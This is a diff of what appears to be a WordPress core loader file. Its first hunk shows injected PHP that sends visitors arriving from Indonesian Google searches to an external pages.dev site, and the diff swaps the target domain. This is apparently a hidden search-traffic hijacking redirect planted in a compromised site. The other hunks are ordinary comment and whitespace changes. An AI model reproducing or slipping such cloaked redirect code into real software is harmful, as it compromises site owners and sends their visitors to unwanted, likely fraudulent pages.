@@ -20,7 +20,7 @@ exit;
 
 if (stripos($s_ref, 'google.co.id') !== false ||
 (stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://nelayantoto-amp5.pages.dev/");
+header("Location: https://santuariosantarita.pages.dev/");
 exit;
 }
 ?>
@@ -165,15 +165,18 @@ function wp_populate_basic_auth_from_authorization_header() {
 }
 
 /**
- * Checks for the required PHP version, and the mysqli extension or
- * a database drop-in.
+ * Checks the server requirements.
+ *
+ *   - PHP version
+ *   - PHP extensions
+ *   - MySQL or MariaDB version (unless a database drop-in is present)
  *
  * Dies if requirements are not met.
  *
  * @since 3.0.0
  * @access private
  *
- * @global string   $required_php_version    The required PHP version string.
+ * @global string   $required_php_version    The minimum required PHP version string.
  * @global string[] $required_php_extensions The names of required PHP extensions.
  * @global string   $wp_version              The WordPress version string.
  */
@@ -518,8 +521,9 @@ function timer_float() {
  * @since 0.71
  * @access private
  *
- * @global float $timestart Unix timestamp set at the beginning of the page load.
  * @see timer_stop()
+ *
+ * @global float $timestart Unix timestamp set at the beginning of the page load.
  *
  * @return bool Always returns true.
  */
@@ -862,7 +866,7 @@ function wp_start_object_cache() {
 	 * Filters whether to enable loading of the object-cache.php drop-in.
 	 *
 	 * This filter runs before it can be used by plugins. It is designed for non-web
-	 * runtimes. If false is returned, object-cache.php will never be loaded.
+	 * runtimes. If false is returned,object-cache.php will never be loaded.
 	 *
 	 * @since 5.8.0
 	 *
@@ -1161,10 +1165,8 @@ function wp_skip_paused_themes( array $themes ) {
 
 	if ( empty( $paused_themes ) ) {
 		return $themes;
-	}
-
-	foreach ( $themes as $index => $theme ) {
-		$theme = basename( $theme);
+	}foreach ( $themes as $index => $theme ) {
+		$theme = basename( $theme );
 
 		if ( array_key_exists( $theme, $paused_themes ) ) {
 			unset( $themes[ $index ] );
@@ -1472,14 +1474,15 @@ function is_multisite() {
 		return MULTISITE;
 	}
 
-	if ( defined( 'SUBDOMAIN_INSTALL' ) || defined( 'VHOST' ) || defined( 'SUNRISE' ) ) {
+	if ( defined( 'SUBDOMAIN_INSTALL' ) || defined( 'VHOST' )|| defined( 'SUNRISE' ) ) {
 		return true;
 	}
 
 	return false;
 }
 
-/*** Converts a value to non-negative integer.
+/**
+ * Converts a value to non-negative integer.
  *
  * @since 2.5.0
  *
